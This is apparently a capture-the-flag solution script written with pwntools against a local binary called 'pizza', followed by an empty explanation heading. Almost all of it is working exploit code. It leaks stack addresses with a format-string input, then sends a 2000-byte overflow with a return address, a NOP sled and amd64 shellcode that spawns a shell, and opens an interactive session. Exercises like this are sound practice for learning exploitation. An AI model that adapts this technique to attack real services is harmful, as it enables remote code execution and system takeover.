# Code
```
  from pwn import *

  elf = ELF("./pizza")

  context(arch='amd64', os='linux', endian='little', word_size=64)
  getname_address = elf.symbols["getname"]
  input1 = b"%p " * 20

  victim = process("./pizza")
  victim.sendline(input1)
  victim.recvline()

  stack_addresses = victim.recvline().strip().split()
  stack_addresses = stack_addresses[7:]
  stack_offset = int(stack_addresses[3], 16)

  return_address = p64(stack_offset)
  exploit_payload = b"A" * 2000 + return_address + b"\x90" * 100 + asm(shellcraft.amd64.linux.sh())

  victim.sendline(exploit_payload)
  victim.interactive()
```

# Explanation
